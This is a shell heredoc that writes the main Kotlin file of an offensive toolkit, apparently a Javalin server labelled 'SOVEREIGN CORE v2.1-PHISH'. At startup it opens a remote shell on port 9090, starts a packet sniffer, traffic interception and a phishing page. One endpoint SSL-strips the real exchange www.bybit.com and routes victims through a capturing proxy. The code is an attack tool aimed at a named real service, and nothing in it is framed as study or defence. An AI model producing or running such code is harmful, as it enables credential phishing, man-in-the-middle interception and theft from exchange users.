cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
package com.fardc.sigint.core

import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.1 boot OK @ ${Instant.now()}")

    val gatekeeper = Gatekeeper()
    val killSwitch = KillSwitch()
    val port = args.firstOrNull()?.toIntOrNull() ?: 7070

    val rotator = EncryptionKeyRotator()
    val vault = SecurityVault() 
    val interceptor = FinCapInterception()
    val resilience = NetworkResilience()
    val remoteShell = RemoteShell(vault)
    val packetSniffer = PacketSniffer()
    val signalJammer = SignalJammer()
    val signalStealth = SignalStealth()
    val trafficMirror = TrafficMirror()
    val sslStripper = SSLStripper()
    val proxyCapture = ProxyInterceptor(vault)
    val phish = PhishCommander(vault)

    rotator.startRotation()
    interceptor.runInterceptionMode()
    resilience.monitorSystem()
    remoteShell.startShell(9090)
    packetSniffer.startSniffing(9999)

    val app = Javalin.create().start(port)
    phish.setupPhishPage(app)

    println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")

    app.get("/status") { ctx ->
        ctx.json(mapOf("status" to "COMBAT_READY", "version" to "2.1-PHISH"))
    }

    app.get("/attack/bybit/engage") { ctx ->
        val target = "https://www.bybit.com"
        val proxyPort = 8082
        val downgraded = sslStripper.downgradeConnection(target)
        proxyCapture.startIntercept(proxyPort)
        signalStealth.stealthConnect(downgraded, proxyPort)
        ctx.result("🔥 [OFFENSIVE] Chaîne engagée : $downgraded -> Port $proxyPort")
    }

    app.post("/emergency/halt") { ctx ->
        proxyCapture.stop()
        killSwitch.engage()
    }
}
EOF
